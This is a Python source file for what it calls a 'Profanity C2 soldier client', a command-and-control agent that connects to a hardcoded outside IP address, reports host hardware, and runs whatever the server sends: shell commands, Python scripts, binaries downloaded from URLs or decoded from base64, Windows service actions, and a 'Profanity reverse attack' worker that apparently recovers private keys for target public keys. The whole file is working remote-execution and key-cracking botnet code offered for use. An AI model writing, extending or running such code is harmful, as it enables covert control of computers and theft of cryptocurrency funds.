"""
PROFANITY C2 SOLDIER CLIENT (Python Test Version)
Test client to validate commander server before C++ implementation.
"""
import socket
import threading
import json
import time
import random
import platform
import sys
import atexit

# Import hardware profiler
try:
    from soldier_profiler import get_hardware_profile
except ImportError:
    get_hardware_profile = None

# ============================================================================
# CONFIGURATION
# ============================================================================
DEFAULT_SERVER_IP = "144.172.108.187"
DEFAULT_SERVER_PORT = 9999
HEARTBEAT_INTERVAL = 25
SOCKET_TIMEOUT = None # Default socket timeout (None = blocking)

# ============================================================================
# SOLDIER CLIENT
# ============================================================================
class SoldierClient:
    def __init__(self, server_ip: str, server_port: int):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.current_mission = None
        self.interrupted = False
        self.lock = threading.Lock()
        self.hardware_profile = None
        self.current_process = None # Added by user
        
        atexit.register(self.stop) # Added by user

    def stop(self): # Added by user
        """Cleanup on agent exit.""" # Added by user
        self.running = False # Added by user
        if self.current_process: # Added by user
            try: # Added by user
                self.current_process.terminate() # Added by user
            except: # Added by user
                pass # Added by user

    def connect(self):
        """Connect to commander server with jittered retry."""
        while not self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                self.running = True
                print(f"[SOLDIER] Connected to {self.server_ip}:{self.server_port}")
            except Exception as e:
                wait_time = 5 + random.uniform(0, 10)
                print(f"[ERROR] Connection failed: {e}. Retrying in {wait_time:.1f}s...")
                time.sleep(wait_time)
        
        # Detect hardware
        if get_hardware_profile:
            print("[SOLDIER] Detecting hardware...")
            self.hardware_profile = get_hardware_profile()
        
        # Start heartbeat thread
        threading.Thread(target=self._heartbeat_loop, daemon=True).start()
        
        # Register with server
        self._register()
        
    def _register(self):
        """Register this soldier with the commander."""
        if self.hardware_profile:
            info = {
                'cmd': 'REGISTER',
                'hardware': self.hardware_profile.to_dict()
            }
        else:
            info = {
                'cmd': 'REGISTER',
                'hardware': {
                    'cpu': {'model': platform.processor(), 'cores': 1},
                    'ram': {'total_gb': 0, 'available_gb': 0},
                    'gpus': [{'model': 'Unknown', 'vram_gb': 0}],
                    'disk': {'total_gb': 0, 'available_gb': 0},
                    'os': {'name': platform.system(), 'version': platform.version()},
                    'hostname': platform.node()
                }
            }
        self._send(info)
        print("[SOLDIER] Registered with commander")
        
    def _send(self, message: dict):
        """Send message to server."""
        if self.socket:
            data = json.dumps(message) + '\n'
            self.socket.sendall(data.encode('utf-8'))
            
    def _heartbeat_loop(self):
        """Send periodic heartbeats."""
        while self.running:
            time.sleep(HEARTBEAT_INTERVAL)
            try:
                # Heartbeat with timeout
                self.socket.settimeout(5) # Short timeout for heartbeat send
                self._send({'cmd': 'HEARTBEAT'})
                self.socket.settimeout(SOCKET_TIMEOUT) # Restore general timeout
            except socket.timeout:
                print("[WARNING] Heartbeat send timed out. Connection might be unstable.")
                # Optionally, attempt to reconnect or mark connection as broken
            except Exception as e:
                print(f"[ERROR] Heartbeat failed: {e}")
                self.running = False # Stop client on heartbeat failure
                break
            
    def run(self):
        """Main loop - receive and execute missions."""
        buffer = ""
        
        try:
            while self.running:
                data = self.socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        self._process_command(line.strip())
                        
        except Exception as e:
            print(f"[ERROR] {e}")
        finally:
            self.running = False
            if self.socket:
                self.socket.close()
                
    def _process_command(self, message: str):
        """Process command from server."""
        try:
            msg = json.loads(message)
            cmd = msg.get('cmd', '')
            
            if cmd == 'NEW_MISSION':
                self._handle_new_mission(msg)
            elif cmd == 'INTERRUPT':
                self._handle_interrupt(msg)
            elif cmd == 'HEARTBEAT_ACK':
                pass  # Ignore
            elif cmd == 'UPDATE_CONFIG':
                print(f"[CONFIG] {msg}")
            elif cmd == 'RECEIVE_FILE':
                # Handle file transfer from control client
                import base64
                import binascii
                raw_filename = msg.get('filename', 'unknown_file')
                filename = os.path.basename(raw_filename)
                data_b64 = msg.get('data', '')
                expected_crc = msg.get('crc32')
                
                try:
                    file_data = base64.b64decode(data_b64)
                    if expected_crc:
                        actual_crc = binascii.crc32(file_data) & 0xFFFFFFFF
                        if actual_crc != int(expected_crc):
                            print(f"[ERROR] CRC32 Mismatch for {filename}! (Expected: {expected_crc}, Got: {actual_crc})")
                            return
                            
                    with open(filename, 'wb') as f:
                        f.write(file_data)
                    print(f"[FILE] Saved: {filename} ({len(file_data)} bytes). Integrity: OK")

                except Exception as e:
                    print(f"[ERROR] Failed to save {filename}: {e}")
            else:
                print(f"[UNKNOWN] {cmd}")
                
        except json.JSONDecodeError:
            print(f"[WARNING] Invalid JSON")
            
    def _handle_new_mission(self, msg: dict):
        """Handle new mission assignment."""
        with self.lock:
            self.current_mission = msg
            self.interrupted = False
            
        print(f"\n[MISSION] Received {msg.get('type')} - Partition {msg.get('partition')}")
        
        # Execute mission in background
        threading.Thread(
            target=self._execute_mission,
            args=(msg,),
            daemon=True
        ).start()
        
    def _handle_interrupt(self, msg: dict):
        """Handle interrupt signal."""
        with self.lock:
            self.interrupted = True
            if self.current_process:
                print("[INTERRUPT] Terminating current subprocess...")
                try:
                    self.current_process.terminate()
                except Exception as e:
                    print(f"[ERROR] Failed to terminate subprocess: {e}")
                self.current_process = None
            
        print(f"\n[INTERRUPT] {msg.get('reason', 'UNKNOWN')}")
        
    def _execute_mission(self, mission: dict):
        """Execute mission based on type."""
        mission_type = mission.get('type', 'UNKNOWN')
        payload = mission.get('payload', '')
        name = mission.get('name', 'Unknown Mission')
        
        print(f"[EXEC] Starting: {name} (type: {mission_type})")
        
        try:
            if mission_type in ('COMMAND', 'CMD'):
                result = self._exec_command(payload)
            elif mission_type == 'SCRIPT':
                result = self._exec_script(payload)
            elif mission_type == 'BINARY':
                result = self._exec_binary(payload, mission)
            elif mission_type == 'SERVICE':
                result = self._exec_service(payload, mission)
            elif mission_type in ('PROFANITY_REVERSE', 'REVERSE'):
                result = self._exec_profanity(payload, mission)
            else:
                result = f"Unknown mission type: {mission_type}"
                
            # Report completion
            self._send({
                'cmd': 'MISSION_COMPLETE',
                'mission_id': mission.get('id', ''),
                'result': result[:5000] if result else 'OK',
                'success': True
            })
            print(f"[EXEC] Completed: {name}")
            
        except Exception as e:
            self._send({
                'cmd': 'MISSION_COMPLETE',
                'mission_id': mission.get('id', ''),
                'result': str(e),
                'success': False
            })
            print(f"[ERROR] Mission failed: {e}")
        finally:
            with self.lock:
                self.current_process = None # Clear process reference after mission
    
    def _exec_command(self, command: str) -> str:
        """Execute a shell command."""
        import subprocess
        print(f"[CMD] Executing: {command[:100]}...")
        
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=1,
            universal_newlines=True
        )
        with self.lock:
            self.current_process = process

        stdout_lines = []
        stderr_lines = []
        try:
            for line in process.stdout:
                stdout_lines.append(line)
                print(f"[CMD_OUT] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            for line in process.stderr:
                stderr_lines.append(line)
                print(f"[CMD_ERR] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            process.wait(timeout=3600) # Wait for process to finish
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command timed out and was terminated."
        except Exception as e:
            process.kill()
            return f"Error during command execution: {e}"
        
        return "".join(stdout_lines) + "".join(stderr_lines)
    
    def _exec_script(self, script: str) -> str:
        """Execute a Python script."""
        import subprocess
        import tempfile
        import os
        
        print(f"[SCRIPT] Executing Python script ({len(script)} chars)...")
        
        # Write script to temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(script)
            script_path = f.name
        
        process = subprocess.Popen(
            [sys.executable, script_path],
            capture_output=True,
            bufsize=1,
            universal_newlines=True
        )
        with self.lock:
            self.current_process = process

        stdout_lines = []
        stderr_lines = []
        try:
            for line in process.stdout:
                stdout_lines.append(line)
                print(f"[SCRIPT_OUT] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            for line in process.stderr:
                stderr_lines.append(line)
                print(f"[SCRIPT_ERR] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            process.wait(timeout=3600)
        except subprocess.TimeoutExpired:
            process.kill()
            return "Script timed out and was terminated."
        except Exception as e:
            process.kill()
            return f"Error during script execution: {e}"
        finally:
            os.unlink(script_path)
        
        return "".join(stdout_lines) + "".join(stderr_lines)
    
    def _exec_binary(self, payload: str, mission: dict) -> str:
        """Download and execute a binary file."""
        import subprocess
        import tempfile
        import base64
        import os
        import urllib.request
        
        print(f"[BINARY] Processing binary payload...")
        
        # Payload can be:
        # 1. URL to download
        # 2. Base64-encoded binary
        # 3. Local path
        
        exe_path = None
        
        if payload.startswith('http://') or payload.startswith('https://'):
            # Download from URL
            print(f"[BINARY] Downloading from {payload[:50]}...")
            with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as f:
                urllib.request.urlretrieve(payload, f.name)
                exe_path = f.name
                
        elif payload.startswith('base64:'):
            # Decode base64
            print(f"[BINARY] Decoding base64...")
            binary_data = base64.b64decode(payload[7:])
            with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as f:
                f.write(binary_data)
                exe_path = f.name
                
        elif os.path.exists(payload):
            # Local path
            exe_path = payload
        else:
            return f"Invalid binary payload: {payload[:50]}"
        
        # Execute
        args = mission.get('args', '')
        cmd = f'"{exe_path}" {args}' if args else exe_path
        
        print(f"[BINARY] Executing: {cmd[:100]}...")
        
        process = subprocess.Popen(
            cmd,
            shell=False, # Changed from True for security
            capture_output=True,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        with self.lock:
            self.current_process = process

        stdout_lines = []
        stderr_lines = []
        try:
            for line in process.stdout:
                stdout_lines.append(line)
                print(f"[BIN_OUT] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            for line in process.stderr:
                stderr_lines.append(line)
                print(f"[BIN_ERR] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            process.wait(timeout=mission.get('timeout_seconds', 3600))
        except subprocess.TimeoutExpired:
            process.kill()
            return "Binary execution timed out and was terminated."
        except Exception as e:
            process.kill()
            return f"Error during binary execution: {e}"
        finally:
            # Cleanup temp file
            if exe_path and exe_path.startswith(tempfile.gettempdir()):
                try:
                    os.unlink(exe_path)
                except Exception as e:
                    print(f"[WARNING] Failed to delete temp binary {exe_path}: {e}")
        
        return "".join(stdout_lines) + "".join(stderr_lines)
    
    def _exec_service(self, service_name: str, mission: dict) -> str:
        """Start or stop a Windows service."""
        import subprocess
        
        action = mission.get('action', 'start')  # start, stop, restart, status
        
        print(f"[SERVICE] {action.upper()} service: {service_name}")
        
        if action == 'status':
            cmd = f'sc query "{service_name}"'
        elif action == 'start':
            cmd = f'sc start "{service_name}"'
        elif action == 'stop':
            cmd = f'sc stop "{service_name}"'
        elif action == 'restart':
            subprocess.run(f'sc stop "{service_name}"', shell=True, timeout=30)
            time.sleep(2)
            cmd = f'sc start "{service_name}"'
        else:
            return f"Unknown action: {action}"
        
        process = subprocess.Popen(cmd, shell=True, capture_output=True, text=True, bufsize=1, universal_newlines=True)
        with self.lock:
            self.current_process = process

        stdout_lines = []
        stderr_lines = []
        try:
            for line in process.stdout:
                stdout_lines.append(line)
                print(f"[SVC_OUT] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            for line in process.stderr:
                stderr_lines.append(line)
                print(f"[SVC_ERR] {line.strip()}")
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            process.wait(timeout=60)
        except subprocess.TimeoutExpired:
            process.kill()
            return "Service command timed out and was terminated."
        except Exception as e:
            process.kill()
            return f"Error during service command execution: {e}"
        
        return "".join(stdout_lines) + "".join(stderr_lines)
    
    def _exec_profanity(self, payload: str, mission: dict) -> str:
        """Execute Profanity reverse attack using profanity_gpu.py worker."""
        import subprocess
        import os
        
        try:
            data = json.loads(payload) if isinstance(payload, str) else payload
        except:
            data = {'pubkey': payload}
        
        pubkey = data.get('pubkey', '')
        partition = data.get('partition', 0)
        steps = mission.get('steps', 100000)
        offset = mission.get('offset', 0)
        mode = mission.get('mode', 'reverse')
        table = mission.get('table', 'precomp.bf') # Default table name
        
        print(f"[PROFANITY] Starting {mode} - Partition {partition}, {steps} steps at offset {offset}")
        
        # Build command: python tools/profanity_gpu.py --mode reverse --target <pubkey> --table <table_path> --offset <offset> --range <steps>
        worker_path = os.path.join("tools", "profanity_gpu.py")
        if not os.path.exists(worker_path):
            worker_path = "profanity_gpu.py" # Fallback if in dist pack
            
        cmd = [
            sys.executable, "-u", worker_path,
            "--mode", mode,
            "--range", str(steps),
            "--offset", str(offset)
        ]
        
        if mode == "reverse":
            cmd.extend(["--target", pubkey, "--table", table])
        else:
            cmd.extend(["--output", table])

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        with self.lock:
            self.current_process = process
        
        full_output = []
        try:
            for line in process.stdout:
                line = line.strip()
                if not line: continue
                
                full_output.append(line)
                print(f"[WORKER] {line}")
                
                # Check for progress string: PROGRESS|[percent]|[speed]|[eta]
                if line.startswith("PROGRESS|"):
                    parts = line.split("|")
                    if len(parts) == 4:
                        self._send({
                            'cmd': 'PROGRESS',
                            'percent': float(parts[1]),
                            'speed': f"{parts[2]} keys/s",
                            'eta': int(parts[3]),
                            'partition': partition
                        })
                
                # Check for interruption
                with self.lock:
                    if self.interrupted:
                        process.terminate()
                        return "INTERRUPTED"
            
            process.wait(timeout=10)
        except Exception as e:
            process.kill()
            return f"Error: {e}"
            
        return "\n".join(full_output)
        
    def disconnect(self):
        """Disconnect from server."""
        self.running = False
        if self.socket:
            self.socket.close()

# ============================================================================
# MAIN
# ============================================================================
if __name__ == "__main__":
    server_ip = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_SERVER_IP
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_SERVER_PORT
    
    print("="*50)
    print("  PROFANITY C2 SOLDIER (Test Client)")
    print("="*50)
    
    soldier = SoldierClient(server_ip, server_port)
    
    try:
        soldier.connect()
        soldier.run()
    except KeyboardInterrupt:
        pass
    except ConnectionRefusedError:
        print(f"[ERROR] Cannot connect to {server_ip}:{server_port}")
    finally:
        soldier.disconnect()
        print("\n[SOLDIER] Disconnected")
